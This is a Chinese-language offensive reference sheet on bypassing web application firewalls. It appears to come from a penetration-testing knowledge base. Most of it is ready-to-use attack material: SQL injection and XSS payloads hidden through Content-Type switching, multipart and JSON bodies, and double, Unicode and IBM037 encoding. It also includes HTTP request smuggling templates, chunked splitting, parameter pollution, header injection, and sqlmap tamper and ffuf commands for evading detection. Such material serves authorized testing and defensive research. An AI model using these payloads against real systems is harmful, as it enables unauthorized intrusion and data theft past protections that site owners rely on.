# 通用 WAF 绕过技术

适用于所有 Web 漏洞类型（SQLi/XSS/LFI/SSTI/RCE 等）。
各漏洞类型特定的绕过技巧在各自的 reference 文件中。

---

## 1. WAF 指纹识别（第一步）

```
# wafw00f 识别 WAF 厂商
wafw00f http://TARGET
wafw00f http://TARGET -a    # 测试所有已知WAF

# 手动识别
curl -sI http://TARGET | grep -i "server\|x-powered\|x-cdn\|cf-ray\|x-akamai\|x-sucuri"
# cf-ray → Cloudflare
# x-amz-cf → AWS CloudFront
# x-sucuri → Sucuri
# AkamaiGHost → Akamai
# 403页面特征也可识别WAF厂商

# nmap
nmap --script http-waf-detect,http-waf-fingerprint -p 80,443 TARGET
```

---

## 2. Content-Type / Body Parser 差异（高价值通用测试）

WAF 根据 Content-Type 选择解析引擎。切换格式可绕过检测。
WAFFLED 研究（ACSAC 2025）：仅靠 Content-Type 混淆就在 5 大 WAF 上实现 1207 个绕过。

```
# 原始请求（被WAF拦截）
POST /api/search HTTP/1.1
Content-Type: application/x-www-form-urlencoded
query=shoes' OR 1=1--

# JSON body绕过（WAF不检查JSON内部值）
POST /api/search HTTP/1.1
Content-Type: application/json
{"query": "shoes' OR 1=1--"}

# JSON + Unicode 转义（更隐蔽）
{"query": "shoes\u0027 OR 1=1--"}

# multipart/form-data 绕过
POST /api/search HTTP/1.1
Content-Type: multipart/form-data; boundary=----abc
------abc
Content-Disposition: form-data; name="query"

shoes' OR 1=1--
------abc--

# XML body（部分应用支持）
POST /api/search HTTP/1.1
Content-Type: application/xml
<query>shoes' OR 1=1--</query>
```

---

## 3. HTTP 请求走私（HRS）

HTTP Desync 不只是 WAF 绕过，而是独立漏洞类别。这里仅保留“WAF/前后端解析不一致”的入口；完整 CL.TE/TE.CL/CL.0/0.CL/H2/2026 parser-differential 测试 → **http-desync.md**。

利用前端（WAF/CDN）与后端对请求边界的解析差异，让 payload 绕过 WAF 检查。

```
# CL.TE（前端用Content-Length，后端用Transfer-Encoding）
POST / HTTP/1.1
Host: TARGET
Content-Length: 13
Transfer-Encoding: chunked

0

SMUGGLED_REQUEST_HERE

# TE.CL（前端用Transfer-Encoding，后端用Content-Length）
POST / HTTP/1.1
Host: TARGET
Content-Length: 3
Transfer-Encoding: chunked

8
SMUGGLED
0

# HTTP/2 → HTTP/1.1 降级走私（H2.CL / H2.TE）
# 当CDN/WAF接收HTTP/2但转发HTTP/1.1到后端时
# 利用HTTP/2伪头注入Content-Length或Transfer-Encoding

# 检测工具
# Burp扩展: HTTP Request Smuggler
# 命令行: smuggler.py (github.com/defparam/smuggler)
python3 smuggler.py -u https://TARGET
```

---

## 4. 编码绕过

### URL 编码

```
# 单次编码（大多WAF会解码）
' → %27    < → %3c    > → %3e

# 双重编码（WAF解码一次，后端再解码一次）
' → %2527    < → %253c
# %25 = %，所以 %2527 → WAF解码为 %27 → 后端解码为 '

# 三重编码（极少数场景）
' → %252527
```

### Unicode 绕过

```
# 全角/兼容字符只有在后端确实做 Unicode normalization 时才可能折叠成ASCII。
# 先用无害探针确认 WAF层与应用层规范化差异，再做漏洞payload。
ＳＥＬＥＣＴ → 可能在 NFKC/NFKD 等特定规范化后变为 SELECT
＜script＞ → 是否变为 <script> 取决于实际 normalization pipeline
# 完整方法 → parser-differentials.md

# Unicode同形字（视觉相同但编码不同）
a → а (Cyrillic U+0430)
o → ο (Greek U+03BF)

# JSON Unicode转义
{"input": "\u003cscript\u003ealert(1)\u003c/script\u003e"}
# \u003c = <, \u003e = >
```

### 字符集编码

```
# IBM037/IBM500（IIS 6/7.5/8/10支持）
# 将payload编码为IBM037字符集
POST /api HTTP/1.1
Content-Type: application/x-www-form-urlencoded; charset=IBM037
%A7%95%89%96%95+%A2%85%93%85%83%A3   # union select

# 工具: 手动用Python
python3 -c "print('union select'.encode('IBM037').hex())"
```

---

## 5. HTTP 协议层绕过

### Chunked Transfer Encoding

```
# 将payload拆分到多个chunk，WAF可能只检查第一个
POST /api HTTP/1.1
Transfer-Encoding: chunked

3
id=
4
1' O
6
R 1=1
2
--
0

```

### HTTP Parameter Pollution（HPP）

```
# 不同后端对重复参数的处理不同
# ASP.NET: 连接所有值（id=1,2' OR 1=1--）
# PHP: 用最后一个
# Java: 用第一个

?id=1&id=2' OR 1=1--
# WAF检查 id=1（安全），后端用 id=2' OR 1=1--
```

### CRLF 注入

```
# 在Header中注入换行符
GET /page?param=value%0d%0aX-Injected-Header:%20true HTTP/1.1
# 可能让WAF误判请求结构
```

---

## 6. 注入点扩展

```
# WAF通常重点检查URL参数和POST body，以下位置检查较松：

X-Forwarded-For: 127.0.0.1' OR 1=1--
X-Originating-IP: 127.0.0.1' OR 1=1--
User-Agent: <script>alert(1)</script>
Referer: http://target.com' UNION SELECT 1--
Cookie: session=abc' AND 1=1--

# JSON key注入（极少WAF检查key）
{"admin' OR 1=1--": "value"}
```

---

## 7. 工具配置

### sqlmap WAF 绕过

```
# tamper组合策略
# 轻度绕过
sqlmap -r req.txt --tamper=space2comment,randomcase --random-agent

# 中度绕过
sqlmap -r req.txt --tamper=space2comment,between,randomcase,charencode \
       --random-agent --delay=2

# 重度绕过（Cloudflare等）
sqlmap -r req.txt --tamper=charunicodeencode,space2comment,between \
       --random-agent --delay=3 --technique=BT --level=5 --risk=3

# JSON body
sqlmap -r req.txt --data='{"id":"1*"}' --tamper=space2comment --random-agent

# 常用tamper脚本:
#   space2comment     空格→/**/
#   between           >→BETWEEN, =→LIKE
#   randomcase        随机大小写
#   charencode        字符编码
#   charunicodeencode Unicode编码
#   percentage        %插入(IIS)
#   space2mssqlblank  MSSQL空白字符替换
#   equaltolike       =→LIKE
```

### Ghauri WAF 绕过

```
# Ghauri对加固目标自适应能力更强
ghauri -u "http://TARGET/page?id=1" --dbs --force-ssl --timeout=30
```

### ffuf WAF 绕过

```
# 慢速fuzz避免触发rate limit
ffuf -w wordlist.txt -u http://TARGET/FUZZ -rate 10 -H "User-Agent: Mozilla/5.0"

# 通过代理
ffuf -w wordlist.txt -u http://TARGET/FUZZ -x http://127.0.0.1:8080
```

---

## 8. 厂商特定绕过

```
# 不要把“某厂商 = 固定绕过技巧”写死。托管WAF规则、客户自定义规则、
# Bot管理、CDN配置都会改变实际解析和拦截行为。

# Cloudflare / AWS WAF / Akamai / ModSecurity 等都按同一流程：
# 1. 确认厂商/代理链
# 2. 建立被拦截的原始payload基线
# 3. 每次只改变一个解析维度（Content-Type/重复参数/编码/multipart/HTTP版本）
# 4. 判断是WAF理解改变，还是应用本身也改变了语义
# 5. 再组合变体

# ModSecurity CRS 等 anomaly-scoring 规则集还应记录拦截分数/命中规则（若响应可见），
# 不要默认单一编码变体可稳定绕过。

# 通用策略: wafw00f识别 → 确认请求实际经过哪些代理/WAF/parser → 针对性测试
# URL/JSON/multipart/Unicode等解析器差异 → parser-differentials.md
```
